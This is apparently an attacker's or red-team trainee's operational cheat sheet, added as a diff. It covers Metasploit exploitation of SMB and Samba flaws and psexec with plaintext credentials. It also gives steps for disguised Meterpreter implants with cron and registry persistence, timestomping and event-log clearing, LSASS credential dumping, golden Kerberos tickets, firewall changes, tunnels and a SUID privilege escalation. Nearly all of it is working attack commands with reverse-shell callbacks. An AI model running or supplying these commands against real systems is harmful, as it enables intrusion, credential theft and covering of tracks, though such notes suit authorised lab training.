@@ -1,0 +1,1298 @@
+ssh -MS /tmp/t1.ssh -x -v -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p<port> <user>@<IP>
+	ssh -x -v -p<port> <usr>@<IP> -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no
+	
+smbclient //192.168.11.10/C$ -U "administrator"
+L33tHax0r
+get tools\sysinternals\Listdlls.exe /root/listdlls.exe
+cd tools\scripts\
+mget * 
+exit
+chmod +x /root/zclean.sh /root/download.sh /root/fwclean.sh
+
+``` EXPLOIT MANUAL ``` {
+=========================================================================================================================
+DEBUG: if any beacon fails 
+1. check IPs. is there an INTERNAL IP callback needs to reach? Though sometimes needs EXTERNAL
+2. check routing/firewall rules
+3. directly test/nc ports
+-- NOTE: if using meterpreter route for a beacon, does NOT require an RPF/portfwd. just set LHOST to the callback IP. Meterpreter will catch it.
+
+# ms08_067_netapiset {
+use exploit/windows/smb/ms08_067_netapiset 
+set PAYLOAD windows/meterpreter/reverse_tcp 
+set RHOST 127.0.0.1
+set RPORT 5445
+set LHOST 172.17.10.80
+set LPORT 53627
+set ReverseListenerBindAddress 0.0.0.0
+
+show options 
+
+# LOGS 
+SECURITY - 529
+SECURITY - 680
+	- if conatins random generated string for workstation
+
+}
+
+# ms09_050_smb2_negotiate_func_index  {
+
+#  revshell method (preferred) {
+use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
+set payload windows/meterpreter/reverse_tcp
+set RHOSTS 127.0.0.1
+set RPORT 4445 
+set LPORT 4444
+set LHOST 172.17.10.80 # consider an internal IP
+
+run
+
+}
+
+#  bindshell method {
+use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
+set payload windows/meterpreter/bind_tcp
+set RHOSTS 127.0.0.1
+set RPORT 4445 
+set LPORT 4444 # opens this listener on tgt
+set DisablePayloadHandler true
+	``` ^^^ ```  # also, requires 2 LPS. 1 for exploit, another for BIND shell
+run
+
+# multi handler config 
+use exploit/multi/handler
+set payload windows/meterpreter/bind_tcp
+set LPORT 42501 
+set RHOST 127.0.0.1 
+}
+
+# LOGS 
+
+}
+
+# bcaaa_bof { 
+use windows/misc/bcaaa_bof 
+set payload windows/meterpreter/reverse_tcp
+set RHOSTS 127.0.0.1 
+set RPORT 16102 (default)
+set LHOST 172.17.10.80 # jump internal IP 
+set LPORT 4444 (default)
+show options 
+
+
+# LOGS - APPLICATION 
+1001 - INFO // mayne 
+1003 - INFO // maybe 
+
+2207 - ERROR <- expect this 
+
+}
+
+# exploit/multi/handler {
+use exploit/multi/handler 
+set payload windows/shell/bind_tcp 
+set LPORT 4444
+set RHOST 127.0.0.1 
+show options 
+
+run
+} 
+
+# psexec {
+use windows/smb/psexec 
+set payload windows/meterpreter/reverse_tcp (default)
+set LHOST 192.168.255.35
+set LPORT 8443
+set RPORT 445
+set RHOST 127.0.0.1
+set SMBUser administrator
+set SMBPass Luhansk2
+
+# LOGS 
+SYSTEM 7009 # psexec  
+SYSTEM 7045 # powershell 
+
+--- clear SYSTEM and POWERSHELL 
+
+run multicommand -cl 'wevtutil qe SYSTEM "/q:*[System [(EventID=7009)]]" /rd:true /f:text' 
+run multicommand -cl 'wevtutil qe SYSTEM "/q:*[System [(EventID=7045)]]" /rd:true /f:text' 
+
+run multicommand -cl 'cmd /c wsupdt.exe -i 7009 SYSTEM -m 14' 
+run multicommand -cl 'cmd /c wsupdt.exe -i 7045 SYSTEM -m 14'
+
+}
+
+# linux/samba/is_known_pipe {
+``` firewall rules/ portfwd in place?  ```
+use exploit/linux/samba/is_known_pipename 
+show info 
+# if we know tgt is x64, set target 3 = Linux x86_64 
+set target 3
+set payload linux/x64/meterpreter/reverse_tcp
+
+set RHOSTS 127.0.0.1 
+set RPORT 4445
+set LHOST 192.168.106.51 # internal or external? 
+set LPORT 4444 # default
+``` below required due to bug in ruby/metasploit!``` 
+set SMB::AlwaysEncrypt false
+set SMB::ProtocolVersion 1
+
+show options 
+run
+
+# LOGS 
+/var/log/samba/smbd.log  # grep for IP and execute times
+- may create artifact 
+	/samba/anonymous --- *.so e.g. /samba/anonymous director
+
+}
+
+=========================================================================================================================
+}
+
+``` MSF ``` {
+=========================================================================================================================
+msfconsole -nq # no database, quiet
+spool /root/mylog 
+
+search -h # view seach criteria 
+search type:exploit platform: windows name:Microsoft app:server
+
+# session management {
+
+# send session to background 
+background 
+
+# view avail. active sessions 
+sessions -l
+
+# interact w/session 
+sessions -i 1
+
+# kill session
+sessions -k 1
+}
+
+# exploit options through tunnels + RELATED LOG IDs {
+
+# ms08_068_netapiset {
+use exploit/windows/smb/ms08_067_netapiset 
+	PAYLOAD windows/shell_reverse_tcp
+	set RHOST 127.0.0.1
+	set RPORT 5445
+	set LHOST 172.17.10.80
+	set LPORT 53627
+	set ReverseListenerBindAddress 0.0.0.0
+}
+
+# ms09_050_smb2_negotiate_func_index - bindshell method {
+use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
+set payload windows/shell/bind_tcp 
+set RHOSTS 127.0.0.1
+set RPORT 4445 
+set LPORT 42501 # opens this listener on tgt
+set DisablePayloadHandler true
+	``` ^^^ ```  # also, requires 2 LPS. ` for exploit, another for BIND shell
+run
+}
+
+# bcaaa { 
+use windows/misc/bcaaa_bof 
+set payload windows/meterpreter/reverse_tcp
+set RHOSTS 127.0.0.1 
+set RPORT 16102 (default)
+set LHOST 172.17.10.80 # internal IP 
+set LPORT 4444 (default)
+show options 
+
+
+# LOGS - APPLICATION 
+1001 - INFO 
+1003 - INFO
+2207 - ERROR 
+
+}
+
+# exploit/multi/handler {
+use exploit/multi/handler 
+set payload windows/shell/bind_tcp 
+set LPORT 42501
+set RHOST 127.0.0.1 
+
+run
+} 
+
+# psexec {
+use windows/smb/psexec 
+set payload windows/meterpreter/reverse_tcp (default)
+set LHOST 192.168.255.35 # need internal?
+set LPORT 8443
+set RPORT 445
+set RHOST 127.0.0.1
+set SMBUser administrator
+set SMBPass Luhansk2
+
+# LOGS 
+SYSTEM 7009 # psexec  
+SYSTEM 7045 # powershell 
+
+run multicommand -cl 'cmd /c wsupdt.exe -i 7009 SYSTEM -m 14' 
+run multicommand -cl 'cmd /c wsupdt.exe -i 7045 SYSTEM -m 14'
+
+}
+
+# linux/samba/is_known_pipe {
+use exploit/linux/samba/is_known_pipename 
+show info 
+	# if we know tgt is x64 
+set target 3 # Linux x86_64 
+set payload linux/x64/meterpreter/reverse_tcp
+
+set RHOSTS 127.0.0.1 
+set RPORT 4446
+set LHOST 192.168.106.51 # need internal?
+set LPORT 42501
+
+``` below required due to bug in ruby/metasploit!``` 
+set SMB::AlwaysEncrypt false
+set SMB::ProtocolVersion 1
+
+- may log to /var/log/samba/log.smbd 
+- may create artifact 
+	/samba/anonymous --- *.so e.g. /samba/anonymous director
+
+}
+
+}
+
+# bind payload syntax {
+set PAYLOAD windows/meterpreter/reverse_tcp_allpors 
+set LHOST / set RHOST 
+exploit -j 
+
+``` prevent payload handler from running on system ! ```
+set DisablePayloadHandler true
+
+}
+
+# implants + some persistence (cron.daily, Run key) {
+
+# implant - meterpreter bind_tcp disguised as trafficserver / apache2 cron persistence { 
+msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=8088 -f elf > bind64-8088
+file bind64-8088
+
+#upload implant 
+scp -P2221 bind64-8088 vakha@127.0.0.1:/home/vakha/trafficserver
+
+# mod perms 
+chmod u=rwx,g=rx,u=rx trafficserver
+ps -elf apache2
+	/usr/sbin/apache2 
+stat /usr/sbin/apache2 
+	2019-01-29 13:33:09.00000000
+	
+# blend it in 
+ls -al /usr/sbin/trafficserver # confirm doesnt exist 
+mv /home/vakha/trafficserver /usr/sbin/trafficserver
+touch -r /usr/sbin/apache2  /usr/sbin/trafficserver
+
+# execute 
+/usr/sbin/trafficserver &
+netstat -punta # confirm listener on 8088
+
+~~~ TEST IT ~~~  
+
+# PERSIST 
+
+# on T1, establish persistence; edit apache2 cron script 
+cd /etc/cron.daily
+stat apache2
+	2015-03-15 05:52:33
+sed -i '20i exec /usr/sbin/trafficserver &' apache2
+cat -n apache2 
+touch -t 201503160552 apache2
+./apache2 # confirm 8088 listening
+
+
+
+
+}
+
+# meterpreter/bind_tcp - svchost.exe masquerade / HKLM Run persistence {
+
+# create payload 
+cd c:/windows/syswow64
+download svchost.exe # use as template for implant 
+
+msfvenom -p windows/meterpreter/bind_tcp LPORT=3389 -f exe -x /root/svchost.exe > services.exe
+	# same size as template file~ 
+
+# upload 
+upload services.exe 
+
+#timestomp 
+dir svchost.exe
+	2009-07-13 21:14:43 
+
+timestomp -m '07/13/2009 21:14:43' services.exe 
+
+# execute implant (background)
+execute -f services.exe
+
+# connect via exploit/multi/handler {
+
+# on T1 
+~+C
+-L3389:192.168.181.72:3389
+use multi/handler 
+set payload windows/meterpreter/bind_tcp 
+	``` NOTE! THERE IS A DIFFERENCE BETWEEN ``` windows/meterpreter/bind_tcp and the default windows/meterpreter_bind_tcp 
+set RHOST 127.0.0.1 
+set RPORT 3389
+
+}
+
+# persistence - registry key on startup. since 32bit program, need to add to wow6432node hive 
+	- HKLM hive so not tied to system, not a user
+reg setval -k 'HKLM\software\wow6432node\microsoft\windows\currentversion\run' -v "Remote Assistance" -d "c:\windows\syswow64\services.exe" -t REG_SZ
+
+reg queryval -k 'HKLM\software\wow6432node\microsoft\windows\currentversion\run' -v "Remote Assistance" 
+
+
+
+}
+
+} 
+
+=========================================================================================================================
+}
+
+``` Meterpreter (mostly WIN) commands ``` {
+=========================================================================================================================
+# general command 
+run multicommand -cl 'cmd /c dir /A /od /tw'
+# output command to localfile (schtasks, logs)
+run multicommand -cl 'cmd /c <COMMAND> ' -f /tmp/file
+-------------------------------------------------------------------------------------------------------------------------
+
+# ENUM (search -d, registry, DNS) {
+
+# searching 
+search -d c:\\users -f *.doc
+search -d 'c:\ProgramData\Microsoft\Windows Defender' -f *.log
+
+# reg enum/query 
+reg enumkey -k 'HKLM\software\microsoft\windows\currentversion\run'
+reg queryval -k 'HKLM\software\microsoft\windows defender\spynet' -v spynetreporting
+
+# view files by mod date 
+cd c:/windows/prefetch 
+run multicommand -cl 'cmd /c dir /A /od /tw'
+
+# DNS {
+load extapi
+
+#BOOT domain 
+adsi_computer_enum BOOT # list all computers in domain 
+adsi_user_enum BOOT # user accounts in domain 
+adsi_nested_group_user_enum -h 
+adsi_nested_group_user_enum BOOT "CN=Domain Admins,CN=Users,DC=boot,DC=lab" # which users are in "Domain Admins" group 
+
+# Enumerate (gabookistan) DNS tables for host/IP addresses of the other members of the domain. 
+run multicommand -cl 'dnscmd /enumrecords gabookistan.lab @'
+
+
+
+}
+
+}
+
+# FIREWALLS {
+
+# review
+run multicommand -cl 'cmd /c netsh advfirewall firewall show rule name=all'
+
+# download all incoming rules 
+run multicommand -cl 'cmd /c netsh advfirewall firewall show rule name=all dir=in verbose > rules'
+# download enabled outgoing 
+	run multicommand -cl 'cmd /c netsh advfirewall firewall show rule name=all dir=out status=enabled > rules'
+download rules
+del rules
+
+# add rule for RPF/beacon 
+run multicommand -cl 'cmd /c netsh advfirewall firewall show rule name=web'
+
+run multicommand -cl 'netsh advfirewall firewall add rule name=web dir=in localport=3389 action=allow protocol=TCP'
+run multicommand -cl 'netsh advfirewall firewall delete rule name=web'
+
+run multicommand -cl 'cmd /c netsh advfirewall firewall show rule name=web'
+
+
+# allow incoming IP traffic, ANY profile 
+run multicommand -cl 'netsh advfirewall firewall add rule name="gerogero" dir=in action=allow protocol=TCP remoteip=192.168.106.10'
+run multicommand -cl 'netsh advfirewall firewall delete rule name=gerogero'
+
+run multicommand -cl 'cmd /c netsh advfirewall firewall show rule name=web'
+}
+
+# MIGRATION (32bit->64, PIDs/UIDs) / TOKEN STEAL { 
+
+# migrate to 64bit payload
+run post/windows/manage/archmigrate SESSION=1 IGNORE_SYSTEM=true
+
+# migrate PID - can see another's HIVE // BACKUP SYSTEM SESSION before migration, otherwise can't revert unless re-exploit
+ps 
+migrate [PID]
+
+# STEAL user token - does not allow to see account's HIVE 
+steal_token [pid]
+ps # verify are now user (cant view bin paths), 'Operation failed: Access is denied' : may be bs 
+drop_token 
+
+}
+
+# MODULES (extapi (DC / DNS ENUM), kiwi) {
+
+# view available modules 
+load -l
+	(command) -h # view syntax/description/args
+
+# extapi - network enum, service, clipboard, wmi // DNS enumeration {
+load extapi 
+
+# dnsenum -> pass the hash (get domain from sysinfo) - BOOT domain {
+adsi_computer_enum BOOT # list all computers in domain 
+adsi_user_enum BOOT # user accounts in domain 
+adsi_nested_group_user_enum -h 
+adsi_nested_group_user_enum BOOT "CN=Domain Admins,CN=Users,DC=boot,DC=lab" # which users are in "Domain Admins" group 
+
+# Enumerate the DNS tables for host/IP addresses of the other members of the domain. 
+run multicommand -cl 'dnscmd /enumrecords gabookistan.lab @'
+
+
+#11.5 STEAL user token (if SYSTEM cannot get info e.g. domain)
+steal_token [pid]
+ps # verify are now user (cant view bin paths), 'Operation failed: Access is denied' : may be bs 
+drop_token 
+
+#12. resolve IPs of 2 candidate win7 tgts 
+resolve HARMONIA 
+	192.168.106.51
+resolve MARBLE
+	192.168.106.50
+	
+	# validate if they are running smb 
+run multicommand -cl 'nbtstat -A 192.168.106.51'
+run multicommand -cl 'nbtstat -A 192.168.106.50' # responds = psexec candidate
+
+#13. pass the hash 
+	Add rule to T1 firewall, allow payload to call back to host/current metasploit sessions 
+	1. review ruleset 
+		run multicommand -cl 'netsh advfirewall firewall show rule name=all'
+	2. allow RDP 
+		run multicommand -cl 'netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=3389'
+	3. prep psexec 
+		bg 
+		use exploit/windows/smb/psexec
+	4. add route to send packets destined for T2 through existing session with T1 - easier than setting up new tunnels 
+		``` ADD ``` (route to network via meterpreter// metasploit framework)
+		route add 192.168.106.0 255.255.255.0 #<session number for route to be active on>
+		route add 192.168.106.0 255.255.255.0 1
+	5. psexec module setup 
+		set RHOSTS 192.168.106.50
+		set LPORT 3389
+		set LHOST 192.168.106.52
+		set payload meterpreter/reverse_tcp # 32bit since unsure if 32 or 64bit arch. if 64, would have x64/ in name
+		set SMBUser Administrator
+		set SMBPass <HASH> 
+			set SMBDomain !BLANK! (since use local not domain creds)
+	``` REMEMBER: psexec uses powershell.exe by default, so LOGGING. Also check EVENT logs from exploit```
+
+
+
+}
+
+}
+
+# kiwi - cred harvesting {
+
+load kiwi 
+	help 
+creds_kerberos # get domain creds 
+kiwi_cmd sekurlsa::logonpasswords # LSASS memory 
+
+#21. golden kerberos ticket : access network at any time
+load kiwi
+golden_ticket_create
+golden_ticket_create -u mossa -d BOOT.LAB -k e3525f929737b049649b9867f1351074 -s S-1-5-21-348695234-4083971140-3581807652 -t /root/goldenboi
+												^ 2nd half of krbtgt hash 
+
+
+}
+
+}
+
+# PORTFWD (+ ReverseListenerComm) {
+
+# LPF to T2 
+portfwd add -L <listener-interface> -l <listener port> -r <remote-IP> -p <remote-port>
+	portfwd add -L 127.0.0.1 -l 4445 -r 192.168.0.11 -p 445
+
+# RPF 
+portfwd add -R -L 127.0.0.1 -l RHP2 -p RHP2
+	// -R 0.0.0.0 by default 
+	
+	# g3r0g3r0 rpf rule (beacon from 192.168.1.10)
+	portfwd add -R -L 127.0.0.1 -l 3389 -s 192.168.1.10 -p 3389
+
+	# RPF - altenative: RPF through meterpreter  
+	set ReverseListenerComm 4 
+
+# DELETE 
+use porforward # 
+portfwd -l 
+portfwd del -i <#> 
+
+portfwd del -R -L 127.0.0.1 -l RHP2 -p RHP2
+	or based on localport
+portfwd del -l 4445
+
+
+			   
+} 
+
+# POST-EXPLOIT ACTIONS (hashdump) {
+
+# dump hashes 
+run post/windows/gather/smart_hashdump
+
+# grab GPO file creds 
+run post/windows/gather/credentials/gpp DOMAINS=BOOT SESSION=<>
+
+# kiwi cred dump  
+load kiwi 
+	help 
+creds_kerberos # get domain creds 
+kiwi_cmd sekurlsa::logonpasswords # LSASS memory 
+
+
+# LINUX hashdump 
+
+``` STOP: did you run basic survey first? ``` 
+run post/linux/gather/hashdump
+cat /etc/ssh/sshd_config
+cat /etc/sudoers
+cat /etc/group
+
+} 
+
+# ROUTES {
+// direct traffic through session. no need for LPF/RPF/PORTFWD: 
+	- great for BEACONS
+	- Tunnels still preferred for bind exploits
+
+# must add routes OUTSIDE of meterpreter session / in msf prompt
+
+route add 192.168.106.0 255.255.255.0 X # X = session number for route to be active on>
+		route add 192.168.106.0 255.255.255.0 1
+route del 192.168.106.0 255.255.255.0 1
+
+
+}
+
+# SESSION BACKUP / USER {
+
+# backup session RPF (beacon) / LPF (bind)  
+run post/windows/manage/multi_meterpreter_inject PAYLOAD=windows/x64/meterpreter/reverse_tcp IPLIST=<connect back to, think RPF LHOST> LPORT=<secondary/unused RPF port> SESSION=<current session num on tgt> HANDLER=true # RPF 
+	run post/windows/manage/multi_meterpreter_inject PAYLOAD=windows/x64/meterpreter/reverse_tcp IPLIST=172.17.10.80 LPORT=16104 SESSION=1 HANDLER=true
+run post/windows/manage/multi_meterpreter_inject IPLIST=<localhost> LPORT=<LPF-bindport> SESSION=1 HANDLER=true # bind
+	run post/windows/manage/multi_meterpreter_inject IPLIST=127.0.0.1 LPORT=54321 SESSION=1 HANDLER=true # bind
+	sessions -i 2 
+	getpid
+	background 
+
+# example 2 	
+run post/windows/manage/multi_meterpreter_inject PAYLOAD=windows/x64/meterpreter/reverse_tcp IPLIST=172.17.10.80 LPORT=16104 SESSION=1 HANDLER=true
+
+
+# duplicate shell (alt method) 
+run duplicate -D -P 364 -p 443 -r 192.168.137.152 
+
+}
+
+# TIMESTOMP {
+dir svchost.exe
+	2009-07-13 21:14:43 
+
+timestomp -m '07/13/2009 21:14:43' services.exe 
+
+
+}
+
+# TOOLS (handle.exe, listdll.exe) {
+
+# handle.exe (hnetcfg.exe) {
+
+# confirm noexist 
+ls c:/windows/temp/hnetcfg.exe 
+
+cd c:/windows/temp
+upload handle64.exe hnetcfg.exe
+#run uploadexec -e handle.exe -p 1684 -a ////// WIP 
+run multicommand -cl 'hnetcfg.exe -p 1684 -a /accepteula'  # process ID/ PID/ proc name 
+	handle -a # ALL handles
+del c:/windows/temp/hnetcfg.exe 
+
+# close handle to an open file 
+run multicommand -cl 'hnetcfg.exe -p 2716 -a /accepteula'
+run multicommand -cl 'hnetcfg.exe -c 6D8 -p 2716 -y'
+	NOW can delete
+
+
+# IF used handle.exe or ANY sysinternal 
+reg enumkey -k "HKU\.Default\Software\Sysinternals"
+reg deletekey -k "HKU\.Default\Software\Sysinternals"
+
+
+
+}
+
+# listdlls.exe (lpksetup.exe) {
+upload listdlls.exe lpksetup.exe
+run multicommand -cl 'cmd /c lpksetup.exe [PID] /accepteula' 
+run multicommand -cl 'cmd /c lpksetup.exe -u [PID]' 
+del lpksetup.exe
+
+# IF used listdll.exe or ANY sysinternal 
+reg enumkey -k "HKU\.Default\Software\Sysinternals"
+reg deletekey -k "HKU\.Default\Software\Sysinternals"
+
+
+}
+
+}
+
+# UPLOAD / DOWNLOAD / UPLOAD&EXEC {
+
+# download 
+download 'c:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\History.Log' /tmp
+download 'c:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\Unknown.Log' /tmp
+
+# upload & execute 
+run uploadexec -e /root/tool2run.exe -r -v 
+
+# upload and run in background (fpipe)
+upload /root/fpipe32b.exe c:\\windows\\temp 
+cd c:\\windows\\temp 
+execute -f fpipe32b.exe -a '-l 12345 -r 45678 192.168.11.26'
+
+}
+
+=========================================================================================================================
+} 
+
+``` NETWORKING (NIX/WIN) (config, firewalls, tunnels, transfer, encoding) ``` {
+=========================================================================================================================
+# network config / discovery  {
+
+# view interfaces 
+ip addr 
+	ifconfig 
+	
+# configure interface - LINUX (add /delete an IP to an)
+sudo ip addr add 192.168.82.98/28 dev eth2	
+sudo ip addr del 192.168.82.98/28 dev eth2	
+	# config interface - SOLARIS 
+	ifconfig e1000g0 172.17.31.14 netmask 255.255.255.0 up ; ifconfig e1000g0 
+	ifconfig e1000g0 down 
+
+# view routes 
+route print 
+ip route 
+
+# add route - LINUX 
+sudo ip route add 172.16.100.0/24 via 192.168.55.1 dev ens160
+	sudo ip route add 172.16.100.152 via 192.168.55.1 dev ens160 
+	# add route - SOLARIS 
+	route add 172.17.0.0/25 172.18.31.12 ; netstat -rn 
+	route delete 172.17.0.0/25 172.18.31.12 ; netstat -rn 
+
+# default gateway (only use on allowed machines e.g. gw/firewall) - LINUX 
+sudo ip route add default via 200.87.39.129 dev eth2
+	# change default gateway ; delete the old default - SOLARIS 
+	route add default 172.18.31.253; route delete default 192.168.11.254; netstat -rn
+
+
+
+# discovery
+arp -a ``` look for additional IPs outside of gateway/interface!```
+arping -I ens160 10.241.247.190
+	# ping sweep
+	for i in $(seq 0 255); do (ping -c1 10.241.147.$i | grep 'bytes from' &); done; sleep 1
+	# arping sweep // maybe view manually w/o grep
+	for i in $(seq 0 255); do (arping -c 1 -I ens160 10.241.147.$i | grep 'Received 1' ); done; sleep 1
+	
+	# then add static arp entry 
+	arp -s 10.241.247.190 00:50:56:8E:D3:5B; arp -vn 
+}
+
+# firewall rules  {
+
+{ # WINDOWS 
+
+# show profile / view rules --- where can i come in / how can i get out 
+netsh advfirewall show currentprofile
+netsh advfirewall firewall show rule name=all
+netsh advfirewall firewall show rule profile=public name=all
+netsh advfirewall firewall show rule name="WEB"
+
+# show only enabled 
+run multicommand -cl 'netsh advfirewall firewall show rule name=all status=enabled'
+
+# add firewall rule, allow incoming traffic port 8081
+runas /user:administrator "netsh advfirewall firewall add rule name="web" dir=in protocol=tcp localport=8081 profile=public action=allow"
+
+# g3r0g3r0 - allow incoming 3333 traffic, ANY profile 
+run multicommand -cl 'netsh advfirewall firewall add rule name="gerogero" dir=in action=allow protocol=TCP localport=33333'
+
+# g3r0g3r02 - allow incoming IP traffic, ANY profile 
+run multicommand -cl 'netsh advfirewall firewall add rule name="gerogero" dir=in action=allow protocol=TCP remoteip=192.168.106.10'
+
+}
+
+{ # NIX 
+
+# view rules 
+iptables -nvL 
+iptables -nvL -t nat 
+
+# allow any traffic from an IP - good for bind/beacon tuns , make sure outbound allows. otherwwise make outbound rule 
+iptables -I INPUT 1 -s 10.18.80.64 -p tcp -j ACCEPT
+iptables -D INPUT 1
+
+# add rule // incoming SSH traffic from .64  (remember -t filter by default) 
+iptables -I INPUT 1 -s 10.18.80.64 -p tcp --dport 22 -j ACCEPT
+
+iptables -nvL
+iptables -D INPUT 1
+
+# add rule // outgoing SSH traffic to .66 # ```!!!```
+iptables -I OUTPUT 1 -d 10.18.80.66 -p tcp --dport 22 -j ACCEPT
+
+iptables -nvL
+iptables -D OUTPUT 1
+
+#allow only SSH traffic from your 1337h4x.ops.local to your Jump Point, NATed to the external IP address of the gateway
+sudo iptables -I FORWARD 1 -s 192.168.11.15 -d 203.0.113.12 -p tcp --dport 22 -j ACCEPT
+	# there's only a default DROP for traffic leaving eth2, so dont need an ingress forward rule 
+sudo iptables -t nat -I POSTROUTING 1 -s 192.168.11.15 -d 203.0.113.12 -o eth2 -j MASQUERADE
+
+}
+
+}
+
+# Non-SSH Tunneling  {
+
+# FPIPE {
+- lightweight redirection program
+- for windows 
+
+#SYNTAX 
+fpipe -l <#incoming port for forwarding#> -r <#outgoing port for forwarding#> <#dst-IP#>
+
+fpipe -l <#incoming port for forwarding#> -s <# source port for OUTBOUND traffic #> -r <#outgoing port for forwarding#> <#dst-IP#>
+fpipe -l 8080 -r 80 198.18.30.12
+fpipe -l 445 -s 1234 -r 8080 111.111.11.111
+		^^^ ensure inbound port is not in use 
+
+{ # fpipe install & LPF use example
+1. drive sharing for rdp conn / msctl : must enable via GUI (local resources -> more -> drives)
+	- to copy/paste across RDP 
+	1.5 login 
+
+2. copy / paste fpipe via GUI
+
+3. admin cmdprompt on win7, UNCHECK 'protect my computer from...'
+	fpipe -l 8080 -r 80 198.18.30.12
+
+}
+
+}
+
+# SOCAT {
+
+# Notes { 
+- Pros:
+	- can redirect: TCP,UDP,ICMP,raw IP! 
+	- can convert protocols: good for forwarding non-TCP traffic through ssh (tcp) tunnels
+							- just need socat on entry to tunnel listener and exit on forwarder
+	- can multiplex with FORK option!
+- Cons:
+	- complex configuration (75+ types of addresses)
+	- size (320kb)
+}
+
+# SYNTAX 
+socat <#address1#> <#address2>
+
+# LPF full line 
+socat TCP-LISTEN:8080,fork TCP-CONNECT:198.18.30.12:80
+
+# LPF setup syntax {
+# LPF Listener SYNAX 
+TCP-LISTEN:8080 
+TCP-LISTEN:8080,fork  # Fork option - handle multiple connections
+
+# LPF Forwarder SYNAX 
+TCP-CONNECT:198.18.30.12 80
+}
+
+# protocol conversion example  {
+
+ssh -p2222 mohunt@100.64.36.17 -L2221:198.18.30.5:22
+nancy123?
+
+
+socat UDP-LISTEN:137 TCP-CONNECT:127.0.0.1:1137 // on linux.ops.local 
+- will initally fail bc--- fail method (for exercise) 
+
+ssh -p2221 remoteuser@127.0.0.1 -L1137:127.0.0.1:1137
+remote 
+# -L1337:
+
+pscp -P 2221 C:\tools\socat\socat-centos5 remoteuser@linux.ops.local:/home/remoteuser/socat
+
+chmod +x socat 
+./socat TCP-LISTEN:1137 UDP-CONNECT:198.18.30.12:137
+
+nbtstat -a 192.168.11.13
+}
+}
+
+# IPTABLES - nat conversion  {
+
+# local redirection (bypass restricted ports / RPF use) { 
+echo "1" > /proc/sys/net/ipv4/ip_forward
+/sbin/iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 615 -j REDIRECT --to 6666
+
+--- dont need OUTPUT, since not expecting to return traffic
+
+/sbin/iptables -t nat -D PREROUTING -s 0.0.0.0 -p tcp --dport 615 -j REDIRECT --to 6155 &&
+echo "0" > /proc/sys/net/ipv4/ip_forward
+}
+
+# general traffic redirection {
+
+# syntax 
+iptables -t nat -A PREROUTING -p tcp --dport <receiving port> -j DNAT --to-destination <tgt-IP>:<tgt-port>
+iptables -t nat -A POSTROUTING -p tcp -d <tgt-IP> --dport <tgt-port> -j SNAT --to-source <local-IP> 
+	# prerouting redirects the packet upon reception // postrouting changes exiting traffics IP (so proceeding traffic can return to this host)
+
+# example { 
+
+#setup 
+echo "1" > /proc/sys/net/ipv4/ip_forward
+iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.42.10:80
+iptables -t nat -A POSTROUTING -p tcp -d 192.168.42.10 --dport 80 -j SNAT --to-source 192.168.42.1
+
+#teardown
+iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.42.10:80
+iptables -t nat -A POSTROUTING -p tcp -d 192.168.42.10 --dport 80 -j SNAT --to-source 192.168.42.1
+echo "0" > /proc/sys/net/ipv4/ip_forward
+}
+
+
+}
+
+}
+
+# PORTPROXY (windows netsh interface) {
+
+# syntax - LPF 
+netsh interface portproxy set v4tov4 listenport=8888 connectaddress=C.C.C.C connectport=80
+	#optional: listenaddress=127.0.0.1 // config. interface for listener, only tcp is supported 
+	netsh interface portproxy set v4tov4 listenaddress=0.0.0.0 listenport=8888 connectaddress=C.C.C.C connectport=80
+}
+
+}
+
+# File Transfer  {
+{ # Standard File Transfer 
+
+# Method notes { 
+``` ================= NIX ================= ```
+- scp & 'net use' assume current system user if no username is given (- almost never works)
+	- often give DOMAIN for the user (domain or local hostname)
+
+# ssh 
+scp 
+	scp [[user1@]host1:]src_file [[user2@]host1:]dst_file
+ssh (sockets) > method 
+
+# FTP 
+ftp 
+
+#web transfer 
+	curl 
+	wget 
+	Invoke-WebRequest 
+	
+#mail transfer 
+
+#network shares 
+	NFS / mount 
+	smb transfer (impacket)
+	
+#other services 
+	- mutt # unix mail 
+	- IRC (download IRC files)
+	- almost any network-enabled service can be used
+	
+``` ================= WIN ================= ``` 
+
+#ssh 
+WinSCP # GUI
+pscp # putty cli for windows 
+
+# ftp 
+ftp (active mode issues across networks where client is firewall/ NATd. may need passive)
+tftp - simple,udp version
+
+# RDP 
+
+	#web 
+		GUI (browser)
+	#cli 
+		mstsc /v:xp.ops.local 
+
+#mail transfer 
+
+#network shares 
+xcopy
+net use p: \\192.168.111.117\c$ /user:[DOMAIN\]username 
+
+# other services 
+rcp
+	requires rsh daemon running on nix?
+
+}
+
+# FTP/TFTP 
+
+{ # Win Shares and HTTP exercise 
+# mount web share 
+net use x: \\www.ops.local\WEB /user:haxor
+
+# wget file 
+wget http://www.ops.local:80/default.htm -O /tmp/default.legit
+
+# pscp file 
+pscp remoteuser@ras.fatdeer.lab:/bin/cat .
+
+# cool privesc: suid tool -OVERWRITE- trick (applies to any tool that can overwrite, but wget example)
+1. have .wget with SUID bit # so can write anywhere... but new files are owned by root... 
+2. choose program you want root perms to (e.g. cat)
+2. overwite a global root SUID program e.g. /bin/ping,/bin/umount,etc. # writes program into a file that you can run with root perms
+	find /bin -perm /u+s # find one 
+	.wget http://server.local:80/nc.jpg -O /bin/umount 
+3. /bin/umount /etc/shadow
+
+
+
+}
+
+{ # RDP exercise 
+
+# RDP connect Win CLI
+mstsc /v:xp.ops.local 
+/v:<server [:port]>] [/admin] [/f [ullscreen]] [/w:] [/h:] [/public] | [/span] [/edit "connection file"] [/migrate] [/?]
+
+# for file transfer via clipboard - server back to client - must edit advanced 'local resources' settings via GUI 
+https://www.helpwire.app/blog/remote-desktop-transfer-files/
+
+mstsc.exe 
+	'Local Resources'
+	'More'
+	*Click on Drives, ensure drives & subcategories are checked
+	*connect
+}
+
+
+}
+
+{ # Non-standard File Transfer 
+
+# Method notes {
+"reverse nc transfer"
+- listen on host, remote system calls to local machine. more likely to pass a firewall
+
+BEST PRACTICES
+1. test technique before using live
+2. compare hashes of files on BOTH ends 
+	NIX
